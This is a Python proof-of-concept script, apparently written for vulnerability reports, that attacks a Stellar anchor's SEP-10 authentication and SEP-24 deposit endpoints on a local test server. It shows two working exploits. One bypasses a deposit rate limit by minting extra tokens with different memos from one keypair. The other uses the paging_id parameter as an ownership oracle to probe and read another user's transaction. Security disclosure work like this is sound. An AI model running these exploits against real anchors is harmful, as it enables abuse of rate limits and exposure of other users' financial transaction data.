import json, uuid, requests, base64
from stellar_sdk import Keypair, TransactionEnvelope, Network
BASE = "http://localhost:8080"
def jwt(kp, memo=None):
    p = {"account": kp.public_key, "home_domain": "localhost:8080"}
    if memo: p["memo"] = memo
    r = requests.get(BASE + "/auth", params=p); r.raise_for_status()
    env = TransactionEnvelope.from_xdr(r.json()["transaction"], Network.TESTNET_NETWORK_PASSPHRASE)
    env.sign(kp)
    r = requests.post(BASE + "/auth", json={"transaction": env.to_xdr()}); r.raise_for_status()
    return r.json()["token"]
def sub(tok):
    return json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "==="))["sub"]
def deposit(tok):
    r = requests.post(BASE + "/sep24/transactions/deposit/interactive", headers={"Authorization": "Bearer " + tok}, json={"asset_code": "USDC"})
    return r.status_code, (r.json().get("id") if r.status_code == 200 else r.text[:80])

print("=== Report 04: rate limit (max 2 / 60s) bypass via SEP-10 memo ===")
A = Keypair.random(); print("attacker G =", A.public_key)
t0 = jwt(A); print("token sub:", sub(t0))
print("deposits with plain token:", [deposit(t0)[0] for _ in range(3)])
codes = []
for m in range(1, 6):
    tm = jwt(A, str(m)); assert sub(tm) == A.public_key + ":" + str(m)
    codes += [deposit(tm)[0] for _ in range(2)]
print("deposits with memo tokens G:1..G:5 (same keypair, same window):", codes)

print("\n=== Report 02: SEP-24 paging_id ownership oracle ===")
V = Keypair.random(); tv = jwt(V); print("victim G =", V.public_key)
B = Keypair.random(); tb = jwt(B, "7"); print("attacker G =", B.public_key)
b1 = deposit(tb)[1]; print("attacker txn A1 =", b1)
vict = deposit(tv)[1]; print("victim txn      =", vict)
b2 = deposit(tb)[1]; print("attacker txn A2 =", b2)
H = {"Authorization": "Bearer " + tb}
r = requests.get(BASE + "/sep24/transactions", params={"asset_code": "USDC", "paging_id": vict}, headers=H)
print("paging_id=<victim id>  ->", r.status_code, [t["id"] for t in r.json().get("transactions", [])] if r.status_code == 200 else r.text)
r = requests.get(BASE + "/sep24/transactions", params={"asset_code": "USDC", "paging_id": str(uuid.uuid4())}, headers=H)
print("paging_id=<random uuid> ->", r.status_code, r.text)
r = requests.get(BASE + "/sep24/transaction", params={"id": vict}, headers=H)
print("GET /sep24/transaction?id=<victim id> as attacker ->", r.status_code, r.text)
